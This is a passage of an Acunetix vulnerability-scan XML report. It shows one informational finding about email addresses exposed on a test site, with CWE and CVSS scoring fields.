          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="117" color="green">
       <Name><![CDATA[Email address found]]></Name>
       <ModuleName><![CDATA[Scanner]]></ModuleName>
       <Details><![CDATA[List of all email addresses found on this host.<br/><br/><ul><li><b>wasp@acunetix.com</b><br/>/</li><li><b>wvs@acunetix.com</b><br/>/, /Templates/</li></ul>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Email addresses posted on Web sites may attract spam.]]></Impact>
       <Description><![CDATA[One or more email addresses have been found on this page. The majority of spam comes from email addresses harvested off the internet. The spam-bots (also known as email harvesters and email extractors) are programs that scour the internet looking for email addresses on any website they come across.  Spambot programs look for strings like myname@mydomain.com and then record any addresses found.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check references for details on how to solve this problem.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[]]></Request>
        <Response><![CDATA[]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Anti-spam techniques]]></Database>
          <URL><![CDATA[https://en.wikipedia.org/wiki/Anti-spam_techniques]]></URL>
        </Reference>
       </References>
      </ReportItem>
		</ReportItems>
 </Scan>
</ScanGroup>
